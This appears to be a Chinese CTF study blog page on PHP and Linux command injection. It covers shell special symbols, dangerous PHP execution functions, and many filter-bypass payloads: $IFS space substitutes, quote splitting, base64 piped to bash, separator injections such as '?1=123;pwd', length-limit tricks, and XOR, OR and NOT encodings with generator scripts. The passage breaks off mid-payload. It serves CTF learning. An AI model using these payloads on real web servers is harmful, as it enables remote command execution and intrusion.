desktopfs-pkgs.txt<br>用户权限<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210410202507800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> <strong>linux特殊符号</strong></p><table><thead><tr><th align="center">*</th><th>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个）</th></tr></thead><tbody><tr><td align="center">.</td><td>‘’.’’后加文件 表示执行文件里的命令 如 . sh 表示执行sh脚本</td></tr><tr><td align="center">&#96;</td><td>反引号常用来命令执行</td></tr><tr><td align="center">?</td><td>匹配任何一个字符（不在括号内时）?代表任意1个字符</td></tr><tr><td align="center">[abcd]</td><td>匹配abcd中任何一个字符</td></tr><tr><td align="center">[a-z]</td><td>表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</td></tr><tr><td align="center">&gt;</td><td>输出重定向，会清空原文内容，然后在向文件里面追加内容表示追加覆盖；常见用法echo world &gt; test.txt</td></tr><tr><td align="center">|</td><td>管道符，cmd1|cmd2 ，会先执行cmd1，然后在cmd1的基础上执行cmd2，如果两条命令没有关系则分别执行两条命令</td></tr><tr><td align="center">||</td><td>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</td></tr><tr><td align="center">&amp;</td><td>前面和后面命令都要执行，无论前面真假</td></tr><tr><td align="center">&amp;&amp;</td><td>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</td></tr></tbody></table><p><strong>文件描述符</strong></p><p>在 Linux 系统中一切皆可以看成是文件，文件又分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核管理已被打开的文件所创建的索引，使用一个非负整数来指代被打开的文件。</p><p>标准文件描述符如下：</p><table><thead><tr><th>文件描述符</th><th>用途</th><th>stdio 流</th></tr></thead><tbody><tr><td>0</td><td>标准输入</td><td>stdin</td></tr><tr><td>1</td><td>标准输出</td><td>stdout</td></tr><tr><td>2</td><td>标准错误</td><td>stderr</td></tr></tbody></table><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="1-相关危险函数"><a href="#1-相关危险函数" class="headerlink" title="1.相关危险函数"></a>1.相关危险函数</h2><blockquote><p>执行(系统)函数</p><p><strong>eval  语句结束必须加分号</strong></p><p><strong>exec - 执行一个外部程序，无回显</strong></p><p>shell_exec </p><p>assert</p><p><strong>system</strong> </p><p>passthru </p><p>proc_open </p><p>pcntl_exec — 在当前进程空间执行指定程序</p><p>pcntl_fork 在当前进程当前位置产生分支（子进程）。</p><p>dl — 运行时载入一个 PHP 扩展</p><p><strong>unserialize - 反序列化一个类函数nashell</strong> </p><p>&#96; 反引号 执行命令</p><p>-———————————————–</p><p>显示源码或者获取配置</p><p>phpinfo </p><p>readfile </p><p>readline </p><p>show_source </p><p>highlight_file</p><p>highlight_string </p><p>curl  反弹shell 外带数据常用</p><p>file </p><p>ini_get_all</p><p>get_cfg_var(“参数”)</p><p>-———————————————–</p><p>回调函数</p><p>array_walk </p><p>array_walk_recursive </p><p>array_map </p><p>call_user_func_array </p><p>call_user_func </p><p>-———————————————–</p><p>数组使用回调函数过滤</p><p>array_filter </p><p>filter_var </p><p>filter_var_array </p><p>-———————————————–</p><p>写入文件</p><p>fopen </p><p>fwrite </p><p>fputs</p><p>file_put_contents - 将数据写入文件中</p><p>file-get-contents - 获取参数的文件资源</p><p>move_uploaded_file - 将上传的文件移动到新位置</p><p>-———————————————–</p><p>命令字符串转义</p><p>escapeshellcmd - 对特殊字符转义</p><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p><p>-———————————————–</p><p>其他</p><p>proc_terminate — 杀除由 proc_open 打开的进程</p><p>touch - 设定文件的访问和修改时间</p></blockquote><h2 id="2-命令执行限制与绕过"><a href="#2-命令执行限制与绕过" class="headerlink" title="2.命令执行限制与绕过"></a>2.命令执行限制与绕过</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$IFS</span><br><span class="hljs-variable">$&#123;IFS&#125;</span><br>$IFS<span class="hljs-variable">$9</span><br>&lt;<br>&lt;&gt;<br>&#123;<span class="hljs-built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br>%20   (space)<br>%09   (tab) 最好用<br>X=$<span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br></code></pre></td></tr></table></figure><h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">拼接<br>a=c;b=at;c=fl;d=ag;$a<span class="hljs-variable">$b</span> $c<span class="hljs-variable">$d</span><br>php中可以用<span class="hljs-string">&#x27;.&#x27;</span>拼接绕过如(<span class="hljs-string">&#x27;sho&#x27;</span>.<span class="hljs-string">&#x27;w_source&#x27;</span>)(<span class="hljs-string">&#x27;/flag.php&#x27;</span>)<br><br><span class="hljs-built_in">base64</span>编码<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|<span class="hljs-built_in">base64</span> -d<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|<span class="hljs-built_in">base64</span> -d|bash (在bash被过滤的情况下可尝试sh)<br><br>单引号、双引号<br>c<span class="hljs-string">&quot;&quot;</span>at fl<span class="hljs-string">&#x27;&#x27;</span>ag<br><br>反斜线<br>c\at fl\ag<br><br>正则 (假设/bin/cat: <span class="hljs-built_in">test</span>: 是一个目录)<br>/???/?[a][t] ?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span><br>/???/?at ????<br>/???/?[a]<span class="hljs-string">&#x27;&#x27;</span>[t] ?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-variable">$1</span>、<span class="hljs-variable">$2</span>等和<span class="hljs-variable">$@</span><br><span class="hljs-variable">$#</span> 是传给脚本的参数个数<br><span class="hljs-variable">$0</span> 是脚本本身的名字<br><span class="hljs-variable">$1</span> 是传递给该shell脚本的第一个参数<br><span class="hljs-variable">$2</span> 是传递给该shell脚本的第二个参数<br><span class="hljs-variable">$@</span> 是传给脚本的所有参数的列表<br>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个<br>$$ 是脚本运行的当前进程ID号<br>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误<br></code></pre></td></tr></table></figure><h3 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h3><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>grep<br>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：<br>grep test *file<br>strings</p></blockquote><h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><blockquote><p>cat$IFS$9ls</p><p>cat$IFS$9$(ls)</p></blockquote><p>(内联，就是将&#96;&#96;或$()内命令的输出作为输入执行)</p><h3 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h3><p>例子：<code>system(&quot;echo &quot;.$_GET[1]);</code></p><table><thead><tr><th>功能</th><th>符号</th><th>payload</th></tr></thead><tbody><tr><td>换行符</td><td>%0a</td><td>?1&#x3D;123%0apwd</td></tr><tr><td>回车符</td><td>%0d</td><td>同上</td></tr><tr><td>连续指令</td><td>;</td><td>?1&#x3D;123;pwd</td></tr><tr><td>后台进程</td><td>&amp;</td><td>?1&#x3D;123&amp;pwd</td></tr><tr><td>管道符</td><td>|(显示后面语句的结果)</td><td>?1&#x3D;123|pwd</td></tr><tr><td>逻辑运算</td><td>||或&amp;&amp;</td><td>?1&#x3D;123||pwd</td></tr></tbody></table><h3 id="利用GET-POST传入变量"><a href="#利用GET-POST传入变量" class="headerlink" title="利用GET POST传入变量"></a>利用GET POST传入变量</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">如果是<span class="hljs-keyword">eval</span>函数<br><span class="hljs-string">`$_GET[1]`</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-keyword">ls</span>);<br>or include$_GET[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-keyword">ls</span>);也可以用<span class="hljs-keyword">filter</span>等伪协议读取文件<br></code></pre></td></tr></table></figure><h3 id="绕过长度限制执行命令的tricks"><a href="#绕过长度限制执行命令的tricks" class="headerlink" title="绕过长度限制执行命令的tricks"></a>绕过长度限制执行命令的tricks</h3><p>一些前置知识：</p><p>1.通过&gt;来创建文件；通过&gt;将命令执行的结果存入文件中</p><p>2.sh -c *可以让当前文件名作为命令执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-built_in">whoami</span> 创建<span class="hljs-built_in">whoami</span>文件</span><br>sh -c * //执行文件名的命令 输出用户名<br></code></pre></td></tr></table></figure><p>3.在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 “&quot;，可以将一条命令写在多行<br>比如我们有一个test文件内容如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ec<span class="hljs-string">\</span><br>ho <span class="hljs-string">\</span><br>hello <span class="hljs-string">\</span><br>world!<br></code></pre></td></tr></table></figure><p>sh test 执行 输出 hello world</p><p>4.用 *可以得到当前目录下的所有目录及文件名，而且能用文件名执行命令。</p><p>5.反弹 shell 时候用的 IP 可以换成十进制不带小数点的。</p><p>6.可以依次执行 &gt;env, *&gt;x，相当于执行 env&gt;x，就能在 x 文件里得到环境变量里的内容；flag在根目录下时，ls &#x2F;&gt;0,nl *&gt;0,访问0即可</p><p>7.ls -t命令</p><p>在linux中，我们使用ls -t命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> a<br><span class="hljs-built_in">touch</span> b<br><span class="hljs-built_in">touch</span> c<br><span class="hljs-built_in">ls</span> -t 输出 c b a<br>&gt;3<br>&gt;2<br>&gt;1<br><span class="hljs-built_in">ls</span> -t 输出1 2 3<br></code></pre></td></tr></table></figure><p><strong>8.利用ls -t 和 &gt; 以及换行符 绕过长度限制执行命令</strong></p><p><img src="/image/2.jpg"></p><p>此处不用w也可以</p><p>这里注意小细节- 空格 \ 等字符前都要加\进行转义</p><h3 id="环境变量拼接构造字母数字"><a href="#环境变量拼接构造字母数字" class="headerlink" title="环境变量拼接构造字母数字"></a>环境变量拼接构造字母数字</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-variable">$c</span>)</span></span><br></code></pre></td></tr></table></figure><p>白名单<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ$&#125;&#123;_:?.~空格</code></p><p>过滤了字母数字</p><p>前置知识：</p><p>常见的字母数字构造 </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$PWD</span>和<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span>&#125;    /var/www/html  结果一样<br><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#PWD&#125;         13    $PWD的长度</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span>&#125;        r/www/html   <br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~</span><span class="hljs-number">3</span>&#125;    html  ~n 倒过来一直到第n+<span class="hljs-number">1</span>位<br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>&#125;          /  <span class="hljs-symbol">:</span><span class="hljs-symbol">:n</span> 获取变量前几位<br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>&#125;     r  n：m 第n+<span class="hljs-number">1</span>个字符 截取m个<br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>&#125; h<br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">SHLVL</span><span class="hljs-symbol">:~A</span>&#125; <span class="hljs-number">1</span>    A是字符串 转换为数字相当于<span class="hljs-number">0</span>   <br>shlvl-进程的深度<br><span class="hljs-variable">$SHLVL</span>   <span class="hljs-number">1</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:~A</span>&#125;   n 一般path结尾都是 /bin<br><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#TERM&#125;  14(终端)</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#TERM&#125;:$SHLVL&#125;    n   相当于$&#123;PATH:14:1&#125; PATH的第十四位时n</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#RANDOM&#125;  # 4或者5</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~A</span>&#125;  l 默认工作路径是/var/www/html<br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#RANDOM&#125;:$&#123;#SHLVL:~A&#125;&#125; l  $PATH:/usr/local……</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-string">?&#125;</span>  <span class="hljs-number">0</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#?&#125;  1</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span>A&#125;<span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125; --&gt;  / </span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span>A&#125;<span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;   --&gt; /</span><br></code></pre></td></tr></table></figure><p>拼接</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"> nl flag.php<br> c=<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:~A</span>&#125;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~A</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-regexp">/bin/base</span>64 flag.php <br>c=<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???(这个没过滤#时可以)</span><br>c=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br>&lt;A返回的错误值 使得<span class="hljs-variable">$?</span>为<span class="hljs-number">1</span>   (<span class="hljs-variable">$?</span>默认是<span class="hljs-number">0</span>，错误代码时返回<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="无字母数字getshell"><a href="#无字母数字getshell" class="headerlink" title="无字母数字getshell"></a>无字母数字getshell</h3><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>异或^  php中，不止数字可以异或，两个字符串异或后还是字符串，过滤了字母数字则可以用在正则之外的字符进行运算得到我们要的字符 ps:X</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">127</span>):<br>            result=i^j<br>            <span class="hljs-built_in">if</span>(<span class="hljs-built_in">chr</span>(result) is <span class="hljs-string">&#x27;X&#x27;</span>): <span class="hljs-comment">//python中的chr()函数用来返回指定参数所对应的Unicode字符</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&#x27;^&#x27;</span>+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&#x27;==&#x27;</span>+<span class="hljs-built_in">chr</span>(result))<br></code></pre></td></tr></table></figure><p>多个字符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);   <span class="hljs-comment">//创建一个 txt 文档并写入内容</span><br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;          <span class="hljs-comment">//dechex十进制数变为十六进制</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>;    <span class="hljs-comment">// 根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;   <span class="hljs-comment">//16进制数转为ASCII码</span><br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>        <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>        <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;     <span class="hljs-comment">//可见字符</span><br>            <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure><p>得到可见字符</p><p><img src="/image/3.jpg" alt="3"></p><p>运行如下脚本即可</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs lua">def action(<span class="hljs-built_in">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">arg</span>:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> True:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               #<span class="hljs-built_in">print</span>(i)<br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.<span class="hljs-built_in">close</span>()<br>   <span class="hljs-built_in">output</span>=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(<span class="hljs-built_in">output</span>)<br><br><span class="hljs-keyword">while</span> True:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/05/2NrKdtVHfIy6G9m.png" alt="img"></p><p>php7有个新特性 可通过”()()”的形式来执行函数，但php5不行</p><p>如system(ls)–&gt;(system)(ls) 如异或后</p><p><img src="https://i.loli.net/2021/08/05/8HJXSFWmQY9t1UK.png" alt="img"></p><h3 id="或运算"><a href="#或运算" class="headerlink" title="或运算"></a>或运算</h3><p>和异或差不多 改下符号即可</p><p>附上羽师傅的脚本链接</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>取反的符号是~，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p><p>我们可以直接对一串恶意代码进行取反然后 URL 编码，在发送 Payload 的时候再次将其取反便可将代码还原，然后将其动态执行。并且，因为是取反，基本上用的都是不可见字符，所以不会触发到正则表达式。假设我们要构造一个 phpinfo();，由于因为没有过滤括号，所以只需要先取反再编码字符串 “phpinfo” 就行了：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(~<span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span 